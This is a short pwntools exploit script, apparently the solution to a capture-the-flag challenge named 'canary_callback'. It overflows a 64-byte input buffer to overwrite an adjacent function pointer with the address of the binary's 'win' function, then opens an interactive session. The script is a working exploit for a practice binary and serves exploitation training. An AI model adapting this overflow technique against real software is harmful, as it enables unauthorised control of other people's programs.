#!/usr/bin/env python3
from pwn import *

exe = ELF("./canary_callback", checksec=False)
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_CAST = 64   # size of incantation[64]; cast pointer sits here

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    # ── exploit phase ─────────────────────────────────────────────────────────
    r.recvuntil(b'Whisper your incantation:\n')

    payload = flat(
        b'A' * OFFSET_TO_CAST,
        p64(exe.sym.win),
    )
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()